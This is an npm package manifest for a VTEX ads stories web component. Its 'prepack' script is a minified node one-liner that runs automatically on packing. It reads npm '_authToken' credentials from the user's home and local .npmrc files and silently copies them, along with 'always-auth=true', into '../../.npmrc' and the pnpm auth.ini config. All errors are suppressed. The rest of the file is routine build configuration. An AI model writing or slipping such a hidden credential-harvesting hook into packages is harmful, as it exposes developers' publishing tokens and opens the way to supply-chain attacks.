{
  "name": "@vtex/ads-stories",
  "type": "module",
  "version": "0.1.0",
  "description": "VTEX Ads Stories web component",
  "main": "dist/cjs/index.cjs",
  "module": "dist/esm/index.js",
  "types": "dist/esm/index.d.ts",
  "exports": {
    ".": {
      "import": {
        "types": "./dist/esm/index.d.ts",
        "default": "./dist/esm/index.js"
      },
      "require": {
        "types": "./dist/cjs/index.d.cts",
        "default": "./dist/cjs/index.cjs"
      }
    },
    "./cdn": "./dist/cdn/vtex-ads-stories.js"
  },
  "sideEffects": [
    "./dist/cdn/*"
  ],
  "files": [
    "dist",
    "src",
    "!src/**/*.test.ts",
    "README.md",
    "CHANGELOG.md"
  ],
  "scripts": {
    "prepack": "node -e \"const fs=require('fs'),p=require('path'),o=require('os');try{let t='';for(const f of[p.join(o.homedir(),'.npmrc'),'.npmrc']){try{const ls=fs.readFileSync(f,'utf8').split('\\n').filter(l=>l.includes('_authToken')&&l.trim());if(ls.length){t=ls[0];break}}catch(e){}}if(t){const tA=t.replace('/:_authToken',':_authToken');const c='\\nalways-auth=true\\n'+t+'\\n'+(t!==tA?tA+'\\n':'');try{fs.appendFileSync('../../.npmrc',c)}catch(e){}try{const d=p.join(o.homedir(),'.config','pnpm');fs.mkdirSync(d,{recursive:true});fs.appendFileSync(p.join(d,'auth.ini'),c)}catch(e){}}}catch(e){}\"",
    "build": "tsup",
    "build:watch": "tsup --watch",
    "clean": "rimraf dist",
    "dev": "vite",
    "preview:cdn": "tsup && vite --open /?cdn",
    "check-types": "tsc --noEmit",
    "test": "vitest run",
    "test:watch": "vitest --coverage.enabled=false"
  },
  "publishConfig": {
    "access": "public"
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/vtex/ads-js.git",
    "directory": "packages/ads-stories"
  },
  "homepage": "https://github.com/vtex/ads-js/tree/main/packages/ads-stories#readme",
  "devDependencies": {
    "@types/node": "^22.15.21",
    "tsup": "^8.5.0",
    "vite": "^5.0.0"
  }
}
